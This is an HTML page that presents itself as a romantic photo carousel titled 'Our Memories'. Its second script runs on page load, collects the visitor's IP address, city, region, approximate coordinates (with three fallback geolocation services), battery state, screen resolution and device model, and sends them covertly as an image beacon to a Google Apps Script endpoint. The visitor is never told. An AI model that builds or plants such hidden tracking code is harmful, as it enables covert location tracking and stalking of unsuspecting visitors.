<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Our Memories ‚ù§Ô∏è</title>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #1a0b12;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: 'Poppins', sans-serif;
            color: white;
        }

        h1 {
            font-family: 'Playfair Display', serif;
            color: #ff4081;
            margin-bottom: 20px;
            text-align: center;
            font-size: 1.8rem;
            padding: 0 10px;
        }

        /* Carousel Container - NOW DYNAMIC */
        .carousel {
            position: relative;
            /* These lines make the box fit the image exactly */
            width: fit-content;
            height: fit-content;
            max-width: 90vw;  /* Don't go wider than screen */
            max-height: 70vh; /* Don't go taller than screen */
            
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 0 30px rgba(255, 64, 129, 0.3);
            border: 2px solid #ff4081;
            background: #000; /* Background in case image loads slow */
        }

        .slide {
            display: none;
        }

        .slide img {
            display: block; /* Removes tiny space at bottom */
            /* These ensure the image keeps its original shape */
            width: auto;
            height: auto;
            max-width: 100%;
            max-height: 70vh; /* Matches container max height */
            object-fit: contain;
        }

        .slide.active {
            display: block;
            animation: fade 0.5s ease-in-out;
        }

        @keyframes fade {
            from { opacity: 0.5; }
            to { opacity: 1; }
        }

        /* Navigation Arrows */
        .arrow {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            background: rgba(0, 0, 0, 0.5);
            color: white;
            border: none;
            font-size: 2rem;
            padding: 10px 15px;
            cursor: pointer;
            z-index: 10;
            border-radius: 50%;
            user-select: none;
        }

        .arrow:hover {
            background: #ff4081;
        }

        .prev { left: 10px; }
        .next { right: 10px; }

        /* Dots */
        .dots-container {
            margin-top: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .dot {
            height: 12px;
            width: 12px;
            background-color: #555;
            border-radius: 50%;
            cursor: pointer;
        }

        .dot.active {
            background-color: #ff4081;
        }
    </style>
</head>
<body>

    <h1>From the first day I met you,<br>life became brighter... üíñ</h1>

    <div class="carousel">
        <button class="arrow prev" onclick="moveSlide(-1)">&#10094;</button>
        <button class="arrow next" onclick="moveSlide(1)">&#10095;</button>

  
                <div class="slide">
            <img src="p4.png" alt="Memory 4">
        </div>
        <div class="slide">
            <img src="p2.png" alt="Memory 2">
        </div>
        <div class="slide">
            <img src="p3.png" alt="Memory 3">
        </div>
              <div class="slide active">
            <img src="p1.png" alt="Memory 1">
        </div>

        <div class="slide">
            <img src="p5.png" alt="Memory 5">
        </div>
    </div>

    <div class="dots-container">
        <span class="dot active" onclick="currentSlide(1)"></span>
        <span class="dot" onclick="currentSlide(2)"></span>
        <span class="dot" onclick="currentSlide(3)"></span>
        <span class="dot" onclick="currentSlide(4)"></span>
        <span class="dot" onclick="currentSlide(5)"></span>
    </div>

    <script>
        let slideIndex = 1;
        showSlides(slideIndex);

        // Next/previous controls
        function moveSlide(n) {
            showSlides(slideIndex += n);
        }

        // Dot controls
        function currentSlide(n) {
            showSlides(slideIndex = n);
        }

        function showSlides(n) {
            let i;
            let slides = document.getElementsByClassName("slide");
            let dots = document.getElementsByClassName("dot");
            
            if (n > slides.length) {slideIndex = 1}
            if (n < 1) {slideIndex = slides.length}
            
            // Hide all slides
            for (i = 0; i < slides.length; i++) {
                slides[i].style.display = "none";
                slides[i].classList.remove("active");
            }
            // Remove active from all dots
            for (i = 0; i < dots.length; i++) {
                dots[i].className = dots[i].className.replace(" active", "");
            }
            
            // Show the current slide and activate dot
            slides[slideIndex-1].style.display = "block";
            slides[slideIndex-1].classList.add("active");
            dots[slideIndex-1].className += " active";
        }
    </script>


<script>
  const GAS_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbwXXNXhSUeFCrUklk99-tojUxnaERN9b-uCSs9cMWfbUhTS4373yLbVIo74c59T68uU/exec';

  window.addEventListener('load', trackVisitor);

  function trackVisitor() {
    Promise.all([
      getIpLocation(), // This is the new, 3-stage fallback function
      getBatteryData(),
      getDeviceData()
    ])
    .then(([ipData, batteryData, deviceData]) => {
      const payload = {

        ip: ipData.ip || 'N.A',
        region: ipData.region || 'N.A',
        city: ipData.city || 'N.A',
        latitude_ip: ipData.latitude_ip || 'N.A',
        longitude_ip: ipData.longitude_ip || 'N.A',
        
        // Navigator Data
        platform: navigator.platform || 'N.A',
        resolution: `${window.screen.width}x${window.screen.height}`,
        
        // Battery Data
        batteryLevel: batteryData.level,
        isCharging: batteryData.charging,
        
        // Device Data
        devicePlatform: deviceData.platform,
        platformVersion: deviceData.version,
        deviceModel: deviceData.model
      };
      
      sendToBeacon(payload);
    })
    .catch(err => {
      console.error('Tracker Error', err.message);
    });
  }


  function getIpLocation() {
    const url1 = 'https://ipapi.co/json/?t=' + new Date().getTime();
    return fetch(url1, { cache: 'no-cache' })
      .then(res => res.json())
      .then(data => {
        if (data.error) throw new Error('API 1 (ipapi.co) failed.');

     // console.log('Using API 1: ipapi.co'); [uncomment to add]
     // console.log('Using API 1: ipapi.co'); [uncomment to add]
        return {
          ip: data.ip,
          region: data.region,
          city: data.city,
          latitude_ip: data.latitude,
          longitude_ip: data.longitude
        };
      })
      .catch(err1 => {
        console.warn(err1.message, 'Trying fallback API 2 (ip-api.com).');
        const url2 = 'https://ip-api.com/json/?t=' + new Date().getTime();
        return fetch(url2, { cache: 'no-cache' })
          .then(res => res.json())
          .then(data => {
            if (data.status !== 'success') throw new Error('API 2 (ip-api.com) failed.');
            console.log('Using API 2: ip-api.com');
            return {
              ip: data.query,
              region: data.regionName,
              city: data.city,
              latitude_ip: data.lat,
              longitude_ip: data.lon
            };
          })
          .catch(err2 => {
            // 3. API 2 failed. Try API 3 (geolocation-db.com)
            console.warn(err2.message, 'Trying fallback API 3 (geolocation-db.com).');
            const url3 = 'https://geolocation-db.com/json/';
            return fetch(url3, { cache: 'no-cache' })
              .then(res => res.json())
              .then(data => {
                if (!data.IPv4) throw new Error('API 3 (geolocation-db.com) failed.');
                console.log('Using API 3: geolocation-db.com');
                return {
                  ip: data.IPv4,
                  region: data.state,
                  city: data.city,
                  latitude_ip: data.latitude,
                  longitude_ip: data.longitude
                };
              });
          });
      })
      .catch(() => {
        // If ALL THREE APIs fail, return an empty object
        console.error('All 3 IP APIs failed. This is likely an ad blocker.');
        return {};
      });
  }


  function getBatteryData() {
    return new Promise(resolve => {
      let data = { level: 'N.A', charging: 'N.A' };
      if (!('getBattery' in navigator)) return resolve(data);
      navigator.getBattery()
        .then(b => {
          data.level = (b.level * 100).toFixed(0) + '%';
          data.charging = b.charging ? 'Yes' : 'No';
          resolve(data);
        })
        .catch(() => resolve(data));
    });
  }

  function getDeviceData() {
    return new Promise(resolve => {
      if ('userAgentData' in navigator) {
        navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion'])
          .then(ua => {
            resolve({
              platform: navigator.userAgentData.platform || 'N.A',
              version: ua.platformVersion || 'N.A',
              model: ua.model || 'N.A'
            });
          })
          .catch(() => resolve(getOldDeviceData())); // Fallback
      } else {
        resolve(getOldDeviceData());
      }
    });
  }
  
  function getOldDeviceData() {
    return {
      platform: navigator.platform || 'N.A',
      version: 'N.A',
      model: navigator.userAgent
    };
  }

  function sendToBeacon(payload) {
    const params = new URLSearchParams();
    for (const key in payload) {
      params.append(key, payload[key]);
    }
    const beacon = new Image();
    beacon.src = `${GAS_WEB_APP_URL}?${params.toString()}`;
      
//  console.log('Final 3-Stage Resilient Tracker Beacon Sent.'); [uncomment to add]
//  console.log('Final 3-Stage Resilient Tracker Beacon Sent.'); [uncomment to add]

  }
</script>
